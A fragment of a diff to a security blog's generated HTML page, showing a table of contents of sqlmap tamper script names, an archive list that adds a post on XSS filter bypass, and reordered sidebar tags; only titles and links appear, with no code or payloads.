toc-level-4"><a class="toc-link" href="#securesphere-py："><span class="toc-number">32.</span> <span class="toc-text">securesphere.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sp-password-py："><span class="toc-number">33.</span> <span class="toc-text">sp_password.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#space2comment-py："><span class="toc-number">34.</span> <span class="toc-text">space2comment.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#space2dash-py："><span class="toc-number">35.</span> <span class="toc-text">space2dash.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#space2hash-py："><span class="toc-number">36.</span> <span class="toc-text">space2hash.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#space2morecomment-py："><span class="toc-number">37.</span> <span class="toc-text">space2morecomment.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#space2morehash-py："><span class="toc-number">38.</span> <span class="toc-text">space2morehash.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#space2mssqlblank-py："><span class="toc-number">39.</span> <span class="toc-text">space2mssqlblank.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#space2mssqlhash-py："><span class="toc-number">40.</span> <span class="toc-text">space2mssqlhash.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#space2mysqlblank-py："><span class="toc-number">41.</span> <span class="toc-text">space2mysqlblank.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#space2mysqldash-py："><span class="toc-number">42.</span> <span class="toc-text">space2mysqldash.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#space2plus-py："><span class="toc-number">43.</span> <span class="toc-text">space2plus.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#space2randomblank-py："><span class="toc-number">44.</span> <span class="toc-text">space2randomblank.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#symboliclogical-py："><span class="toc-number">45.</span> <span class="toc-text">symboliclogical.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unionalltounion-py："><span class="toc-number">46.</span> <span class="toc-text">unionalltounion.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unmagicquotes-py："><span class="toc-number">47.</span> <span class="toc-text">unmagicquotes.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#uppercase-py："><span class="toc-number">48.</span> <span class="toc-text">uppercase.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#varnish-py："><span class="toc-number">49.</span> <span class="toc-text">varnish.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#versionedkeywords-py"><span class="toc-number">50.</span> <span class="toc-text">versionedkeywords.py</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#versionedmorekeywords-py："><span class="toc-number">51.</span> <span class="toc-text">versionedmorekeywords.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xforwardedfor-py："><span class="toc-number">52.</span> <span class="toc-text">xforwardedfor.py：</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -847,9 +1190,24 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 15
+        Total : 16
         </div>
         <!-- search  -->
         
@@ -862,6 +1220,11 @@ top:50vh;
     
     <div class="archive-year"> 2019 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/04</span><a class="archive-post-title" href="/2019/03/04/xss-bypass-备忘录/">xss bypass 备忘录</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -880,12 +1243,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/安恒杯-一月-web/">安恒杯 一月 web</a>
+            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/2019 fireshell-web-Vice/">2019 fireshell web Vice</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/2019 fireshell-web-Vice/">2019 fireshell web Vice</a>
+            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/安恒杯-一月-web/">安恒杯 一月 web</a>
         </li>
     
     
@@ -954,17 +1317,19 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="Writeup"><span class="iconfont-archer">&#xe606;</span>Writeup</span>
     
-        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
+        <span class="sidebar-tag-name" data-tags="php 伪随机数"><span class="iconfont-archer">&#xe606;</span>php 伪随机数</span>
     
         <span class="sidebar-tag-name" data-tags="反序列化"><span class="iconfont-archer">&#xe606;</span>反序列化</span>
     
-        <span class="sidebar-tag-name" data-tags="SQLi"><span class="iconfont-archer">&#xe606;</span>SQLi</span>
+        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
     
-        <span class="sidebar-tag-name" data-tags="php 伪随机数"><span class="iconfont-archer">&#xe606;</span>php 伪随机数</span>
+        <span class="sidebar-tag-name" data-tags="SQLi"><span class="iconfont-archer">&#xe606;</span>SQLi</span>
     
         <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
     
         <span class="sidebar-tag-name" data-tags="爬虫"><span class="iconfont-archer">&#xe606;</span>爬虫</span>
+    
+        <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
     
         <span class="sidebar-tag-name" data-tags="笔记"><span class="iconfont-archer">&#xe606;</span>笔记</span>
     
